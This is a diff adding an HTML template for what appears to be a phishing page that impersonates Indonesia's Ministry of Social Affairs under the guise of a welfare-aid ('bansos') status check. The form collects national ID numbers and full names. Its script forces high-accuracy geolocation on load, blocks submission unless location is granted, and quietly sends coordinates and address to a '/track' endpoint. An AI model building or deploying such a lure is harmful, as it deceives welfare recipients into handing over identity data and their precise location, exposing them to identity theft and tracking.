@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard - Bantuan Sosial</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #f8fafc;
+            color: #334155;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-icon {
+            font-size: 28px;
+        }
+        
+        .logo-text h1 {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 2px;
+        }
+        
+        .logo-text p {
+            font-size: 12px;
+            opacity: 0.9;
+        }
+        
+        .user-menu {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .user-info {
+            text-align: right;
+        }
+        
+        .user-name {
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        .user-email {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .logout-btn {
+            background: rgba(255,255,255,0.2);
+            color: white;
+            padding: 8px 16px;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 12px;
+            transition: background 0.3s;
+        }
+        
+        .logout-btn:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+        
+        .welcome-card {
+            background: white;
+            padding: 30px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            margin-bottom: 30px;
+            text-align: center;
+        }
+        
+        .welcome-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+            color: #1e3c72;
+        }
+        
+        .welcome-card h2 {
+            color: #1e3c72;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .welcome-card p {
+            color: #64748b;
+            line-height: 1.6;
+        }
+        
+        .form-card {
+            background: white;
+            padding: 40px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+        
+        .form-card h3 {
+            color: #1e3c72;
+            margin-bottom: 25px;
+            font-size: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #374151;
+            font-weight: 600;
+            font-size: 14px;
+        }
+        
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.3s;
+            background: #f8fafc;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #1e3c72;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 20px rgba(30, 60, 114, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .location-status {
+            background: #f0f9ff;
+            border: 1px solid #bae6fd;
+            color: #0369a1;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .location-success {
+            background: #f0fdf4;
+            border-color: #bbf7d0;
+            color: #166534;
+        }
+        
+        .location-error {
+            background: #fef2f2;
+            border-color: #fecaca;
+            color: #dc2626;
+        }
+        
+        .result-message {
+            background: #fffbeb;
+            border: 1px solid #fcd34d;
+            color: #92400e;
+            padding: 20px;
+            border-radius: 10px;
+            margin-top: 25px;
+            text-align: center;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1e3c72;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-animation {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        
+        .success-icon {
+            font-size: 48px;
+            color: #16a34a;
+            animation: bounce 0.6s;
+        }
+        
+        @keyframes bounce {
+            0%, 20%, 60%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            80% { transform: translateY(-5px); }
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px auto;
+            }
+            
+            .form-card {
+                padding: 25px;
+            }
+            
+            .header-content {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+            
+            .user-info {
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-content">
+            <div class="logo">
+                <div class="logo-icon">🏛️</div>
+                <div class="logo-text">
+                    <h1>BANTUAN SOSIAL</h1>
+                    <p>Kementerian Sosial Republik Indonesia</p>
+                </div>
+            </div>
+            <div class="user-menu">
+                <div class="user-info">
+                    <div class="user-name">{{ username }}</div>
+                    <div class="user-email">{{ email }}</div>
+                </div>
+                <a href="{{ url_for('logout') }}" class="logout-btn">Keluar</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="container">
+        <!-- Welcome Card -->
+        <div class="welcome-card">
+            <div class="welcome-icon">👋</div>
+            <h2>Selamat Datang, {{ username }}!</h2>
+            <p>Gunakan form di bawah ini untuk mengecek status bantuan sosial Anda. Pastikan data yang dimasukkan sesuai dengan KTP.</p>
+        </div>
+
+        <!-- Form Card -->
+        <div class="form-card">
+            <h3>📋 Form Pengecekan Bansos</h3>
+            
+            {% if error %}
+            <div class="location-status location-error">
+                {{ error }}
+            </div>
+            {% endif %}
+
+            {% if result_message %}
+            <div class="result-message">
+                <div class="success-animation">
+                    <div class="success-icon">✅</div>
+                </div>
+                {{ result_message }}
+            </div>
+            {% endif %}
+
+            <form method="POST" action="{{ url_for('cek_bansos') }}" id="bansosForm">
+                <input type="hidden" name="latitude" id="latitude">
+                <input type="hidden" name="longitude" id="longitude">
+                <input type="hidden" name="accuracy" id="accuracy">
+                <input type="hidden" name="address" id="address">
+
+                <div class="form-group">
+                    <label for="nik">Nomor Induk Kependudukan (NIK)</label>
+                    <input type="text" id="nik" name="nik" maxlength="16" 
+                           placeholder="Masukkan 16 digit NIK" required
+                           pattern="[0-9]{16}" title="NIK harus 16 digit angka">
+                </div>
+
+                <div class="form-group">
+                    <label for="nama">Nama Lengkap</label>
+                    <input type="text" id="nama" name="nama" 
+                           placeholder="Masukkan nama sesuai KTP" required>
+                </div>
+
+                <div id="locationStatus" class="location-status">
+                    <div class="loading" id="locationLoading">
+                        <div class="spinner"></div>
+                        <p>Mendeteksi lokasi Anda...</p>
+                    </div>
+                    <div id="locationMessage">
+                        🔍 Sistem sedang mendeteksi lokasi Anda secara otomatis
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">
+                    <span id="btnText">🔍 CEK STATUS BANSOS</span>
+                    <div class="loading" id="btnLoading" style="display: none;">
+                        <div class="spinner" style="width: 20px; height: 20px; border-width: 2px;"></div>
+                    </div>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const locationStatus = document.getElementById('locationStatus');
+            const locationLoading = document.getElementById('locationLoading');
+            const locationMessage = document.getElementById('locationMessage');
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const btnLoading = document.getElementById('btnLoading');
+            
+            // Auto detect location on page load
+            getCurrentLocation();
+            
+            function getCurrentLocation() {
+                locationLoading.style.display = 'block';
+                locationMessage.style.display = 'none';
+                
+                if (!navigator.geolocation) {
+                    showLocationError('Browser tidak mendukung deteksi lokasi');
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        // Set hidden fields
+                        document.getElementById('latitude').value = lat;
+                        document.getElementById('longitude').value = lon;
+                        document.getElementById('accuracy').value = accuracy;
+                        
+                        // Get address from coordinates
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                            .then(response => response.json())
+                            .then(data => {
+                                const address = data.address;
+                                const locationText = `${address.village || address.town || address.city || address.county || 'Lokasi'}, ${address.state || address.region || ''}, ${address.country || ''}`.trim();
+                                
+                                document.getElementById('address').value = locationText;
+                                
+                                // Show success message
+                                locationLoading.style.display = 'none';
+                                locationMessage.style.display = 'block';
+                                locationStatus.className = 'location-status location-success';
+                                locationMessage.innerHTML = `✅ Lokasi berhasil terdeteksi: <strong>${locationText}</strong> (Akurasi: ±${Math.round(accuracy)} meter)`;
+                                
+                                // Enable submit button
+                                submitBtn.disabled = false;
+                                
+                                // Send tracking data
+                                fetch('/track', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/json',
+                                    },
+                                    body: JSON.stringify({
+                                        lat: lat,
+                                        lon: lon,
+                                        accuracy: Math.round(accuracy),
+                                        address: locationText,
+                                        timestamp: new Date().toISOString()
+                                    })
+                                });
+                            })
+                            .catch(error => {
+                                const locationText = `Koordinat: ${lat.toFixed(6)}, ${lon.toFixed(6)}`;
+                                document.getElementById('address').value = locationText;
+                                
+                                locationLoading.style.display = 'none';
+                                locationMessage.style.display = 'block';
+                                locationStatus.className = 'location-status location-success';
+                                locationMessage.innerHTML = `✅ Lokasi berhasil terdeteksi: <strong>${locationText}</strong> (Akurasi: ±${Math.round(accuracy)} meter)`;
+                                
+                                submitBtn.disabled = false;
+                            });
+                    },
+                    function(error) {
+                        let errorMessage = 'Gagal mendeteksi lokasi: ';
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = 'Izin lokasi ditolak. Silakan izinkan akses lokasi untuk melanjutkan.';
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = 'Informasi lokasi tidak tersedia.';
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = 'Waktu permintaan lokasi habis.';
+                                break;
+                            default:
+                                errorMessage = 'Terjadi kesalahan saat mendeteksi lokasi.';
+                        }
+                        showLocationError(errorMessage);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            }
+            
+            function showLocationError(message) {
+                locationLoading.style.display = 'none';
+                locationMessage.style.display = 'block';
+                locationStatus.className = 'location-status location-error';
+                locationMessage.innerHTML = `❌ ${message}`;
+                submitBtn.disabled = true;
+            }
+            
+            // Form submission handler
+            document.getElementById('bansosForm').addEventListener('submit', function(e) {
+                const latitude = document.getElementById('latitude').value;
+                const longitude = document.getElementById('longitude').value;
+                
+                if (!latitude || !longitude) {
+                    e.preventDefault();
+                    showLocationError('Lokasi belum terdeteksi. Silakan refresh halaman dan izinkan akses lokasi.');
+                    return;
+                }
+                
+                // Show loading state
+                btnText.style.display = 'none';
+                btnLoading.style.display = 'block';
+                submitBtn.disabled = true;
+            });
+        });
+    </script>
+</body>
+</html>
